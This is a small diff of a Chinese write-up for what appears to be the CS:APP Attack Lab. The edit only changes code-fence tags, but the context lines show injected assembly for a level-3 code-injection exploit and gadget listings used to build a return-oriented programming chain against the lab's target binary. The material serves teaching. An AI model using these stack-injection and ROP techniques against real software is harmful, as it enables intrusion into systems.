@@ -244,7 +244,7 @@ ec 17 40 00 c3 61 61 61
 
 我们把字符串放在了一开始的返回地址的后面，然后写出`phase3.s`：
 
-```s
+```
 # to solve the level 3 of Code Injection Attacks
 mov $0x5561dca8, %rdi # set string address in %rdi
 push $0x4018fa
@@ -287,7 +287,7 @@ fa 18 40 00 c3 61 61 61
 
 执行`objdump -d rtarget > rtarget.asm`，得到的文件中，有这么一段：
 
-```s
+```
 0000000000401994 <start_farm>:
   401994:	b8 01 00 00 00       	mov    $0x1,%eax
   401999:	c3                   	retq   
@@ -489,7 +489,7 @@ fa 18 40 00 c3 61 61 61
 
 仔细找了半天并没有发现有可以直接把值赋给`%rdi`的，但是我们找到了这样一个函数：
 
-```s
+```
 00000000004019a0 <addval_273>:
   4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
   4019a6:	c3    
@@ -499,7 +499,7 @@ fa 18 40 00 c3 61 61 61
 
 接着找有没有给`%rax`赋值的语句，结果发现：
 
-```s
+```
 00000000004019ca <getval_280>:
   4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
   4019cf:	c3                   	retq   
